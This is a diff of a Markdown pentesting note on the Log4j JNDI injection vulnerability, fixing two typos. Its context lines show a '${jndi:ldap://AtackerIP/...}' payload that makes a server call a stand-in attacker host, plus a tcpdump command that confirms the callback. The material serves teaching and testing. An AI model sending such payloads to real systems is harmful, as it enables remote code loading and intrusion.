@@ -13,7 +13,7 @@ tags:
 
 This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection). Log4j is a popular logging library for Java created in 2001. The logging library's main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code. 
 
-## What is does
+## What it does
 
 What a logging library does, is instead of using print statements, the developer just uses a wrapper around the Logging class or object. So instead of using print(line), the code would look like this:
 
@@ -45,7 +45,7 @@ In other words, JNDI is a simple Java API (such as 'InitialContext.lookup(String
 "${jndi:ldap://AtackerIP/whatever}"
 ```
 
-With [tcdump](tcdump.md), check if the request with the payload produces some traffic to your attacker machine:
+With [tcpdump](tcpdump.md), check if the request with the payload produces some traffic to your attacker machine:
 
 ```bash
 sudo tcpdump -i tun0 port 389
